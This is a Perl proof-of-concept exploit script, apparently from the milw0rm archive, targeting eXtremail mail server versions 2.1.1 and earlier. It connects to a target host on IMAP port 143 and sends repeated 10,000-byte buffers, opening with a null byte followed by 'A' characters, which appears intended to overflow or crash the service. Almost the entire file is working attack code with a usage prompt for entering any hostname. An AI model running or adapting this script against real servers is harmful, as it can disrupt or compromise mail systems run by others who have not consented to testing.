#!/usr/bin/perl
#
# extremail-v8.pl
#
# Copyright (c) 2007 by <mu-b@digit-labs.org>
#
# eXtremail <=2.1.1 remote PoC
# by mu-b - Wed Jan 31 2007
#
# Tested on: eXtremail 2.1.1 (lnx)
#            eXtremail 2.1.0 (lnx)
#
#    - Private Source Code -DO NOT DISTRIBUTE -
# http://www.digit-labs.org/ -- Digit-Labs 2007!@$!
########

use Getopt::Std; getopts('t:n:u:p:', \%arg);
use Socket;

&print_header;

my $target;

if (defined($arg{'t'})) { $target = $arg{'t'} }
if (defined($arg{'n'})) { $offset = $arg{'n'} }
if (!(defined($target))) { &usage; }

my $imapd_port = 143;
my $send_delay = 10;
my $loop = 2;

my $NOP = 'A';

if (connect_host($target, $imapd_port)) {
    print("-> * Connected\n");
    sleep(16);

    print("-> * Sending payload\n");
    $buf = "\x00".($NOP x (0x2710-1));
    send(SOCKET, $buf, 0);
    sleep($send_delay);

    $buf = $NOP x 0x2710;
    while ($loop--) {
      print("-> * Sending payload ".$loop."\n");
      send(SOCKET, $buf, 0);
      sleep($send_delay);
    }

    print("-> * Successfully sent payload!\n");
}

sub print_header {
    print("eXtremail <=2.1.1 remote PoC\n");
    print("by: <mu-b\@digit-labs.org>\n");
    print("http://www.digit-labs.org/ -- Digit-Labs 2007!@$!\n\n");
}

sub usage {
  print(qq(Usage: $0 -t <hostname>

     -t <hostname>    : hostname to test
));

    exit(1);
}

sub connect_host {
    ($target, $port) = @_;
    $iaddr  = inet_aton($target)                 || die("Error: $!\n");
    $paddr  = sockaddr_in($port, $iaddr)         || die("Error: $!\n");
    $proto  = getprotobyname('tcp')              || die("Error: $!\n");

    socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
    connect(SOCKET, $paddr)                      || die("Error: $!\n");
    return(1338);
}

# milw0rm.com [2007-10-15]